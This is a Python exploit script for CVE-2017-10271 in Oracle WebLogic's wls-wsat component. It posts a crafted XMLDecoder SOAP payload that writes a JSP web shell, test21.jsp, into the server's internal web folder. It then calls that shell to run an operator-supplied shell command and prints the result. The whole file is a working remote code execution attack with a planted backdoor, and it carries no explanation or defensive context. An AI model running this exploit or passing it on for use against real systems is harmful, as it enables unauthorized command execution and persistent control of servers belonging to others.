import requests
import argparse
import re
import pyfiglet

def banner():
    banner = pyfiglet.Figlet("slant")
    print(banner.renderText("CVE-2017-10271").strip())

def main():
    parse = argparse.ArgumentParser()
    parse.add_argument('-t', '--target',required=True,help="ip:port")
    parse.add_argument('-c', '--cmd', required=False,default='id')
    args = parse.parse_args()
    SendPost(args.target,args.cmd)

def SendPost(target,cmd):
    # if not target.startswith('http'):
    url1 = "http://{}/wls-wsat/CoordinatorPortType".format(target)
    headers1 = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "Content-Type": "text/xml"
    }
    data1 = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> \
            <soapenv:Header> \
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> \
            <java><java version="1.4.0" class="java.beans.XMLDecoder"> \
            <object class="java.io.PrintWriter"> \
            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test21.jsp</string> \
            <void method="println"><string> \
            <![CDATA[<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("c")).getInputStream(); int a = -1; byte[] b = new byte[102];while((a=in.read(b))!=-1){ out.println(new String(b)); } %>]]> \
            </string> \
            </void> \
            <void method="close"/> \
            </object></java></java> \
            </work:WorkContext> \
            </soapenv:Header> \
            <soapenv:Body/> \
            </soapenv:Envelope>'
    response1 = requests.post(url=url1, headers=headers1, data=data1,verify=False)
    url2 = "http://{}/bea_wls_internal/test21.jsp?c={}".format(target,cmd)
    response2 = requests.get(url=url2, headers=headers1,verify=False)
    print(response2.text.strip())

if __name__ == '__main__':
    banner()
    main()
